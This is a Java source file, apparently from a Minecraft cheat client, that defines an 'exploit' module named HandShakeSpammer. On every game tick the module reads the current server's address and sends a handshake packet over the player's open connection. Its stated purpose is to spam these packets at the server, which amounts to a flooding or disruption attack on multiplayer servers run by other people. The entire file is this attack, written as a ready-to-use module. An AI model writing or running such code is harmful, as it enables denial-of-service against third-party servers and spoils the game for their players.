package me.zihasz.zware.impl.module.exploit;

import me.zihasz.zware.api.module.Module;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.handshake.client.C00Handshake;

import java.util.ArrayList;

public class HandShakeSpam extends Module {

    public HandShakeSpam() {
        super("HandShakeSpammer", "Spams C00HandShake packets", Category.EXPLOIT);
    }

    @Override
    public void onUpdate() {
        if (mc.currentServerData == null) return;

        String[] data = mc.currentServerData.serverIP.split(":");
        String ip = data[0];
        int port = Integer.parseInt(data[1]);

        mc.player.connection.sendPacket(new C00Handshake(ip, port, EnumConnectionState.HANDSHAKING));
    }
}
